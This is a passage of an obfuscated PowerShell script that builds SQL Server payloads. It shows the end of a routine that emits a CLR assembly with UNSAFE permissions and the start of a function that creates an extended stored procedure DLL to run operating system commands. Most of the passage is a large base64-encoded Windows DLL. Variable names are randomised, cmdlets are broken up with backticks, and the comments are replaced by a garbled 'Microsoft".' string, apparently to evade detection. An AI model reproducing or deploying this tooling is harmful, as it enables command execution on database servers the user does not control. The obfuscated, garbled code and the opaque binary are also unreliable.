                $CloudyHead.Append($byte.ToString("X2")) > $null
            }
            $null = $CloudyHead.AppendLine("`nWITH PERMISSION_SET = UNSAFE")
            $null = $CloudyHead.Append("")
            $RapidBang = $CloudyHead.ToString() -join ""
            $fileStream.Close()
            $fileStream.Dispose()

        }

        # Microsoft".
        Write-Verbose "Writing SQL to: $SongsErect"
        $RapidBang | `out`-f`i`le $SongsErect 

        # Microsoft".
        Write-CrazyChief "C# Microsoft".
        Write-CrazyChief "CLR DLL: $YakWary"
        Write-CrazyChief "SQL Cmd: $SongsErect"        
    }
    
    End 
    {
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
function Create-SQLFileXpDll
{

    [CmdletBinding()]
    Param(

        [Parameter(Mandatory = $false,
        HelpMessage = 'Operating system command to run.')]
        [string]$SoakSame,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Name of exported function.')]
        [string]$CoughCable,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dll file to write to.')]
        [string]$EightPlease
    )

    # Microsoft".
    # Microsoft".
    # Microsoft".

    # Microsoft".
    $TrainsMarket = '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zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVVdIgezIAAAASIvsSIv8uTIAAAC4zMzMzPOruAEAAABIjaXIAAAAX13DzMzMzMzMzMzMzMzMzMzMzMzMzMzMSIlMJAhVV0iB7MgAAABIi+xIi/y5MgAAALjMzMzM86tIi4wk6AAAAEiNpcgAAABfXcPMzMzMzMzMzMzMzMzMzEiJVCQQSIlMJAhVV0iB7MgAAABIi+xIi/y5MgAAALjMzMzM86tIi4wk6AAAAEiNpcgAAABfXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMTIlEJBiJVCQQSIlM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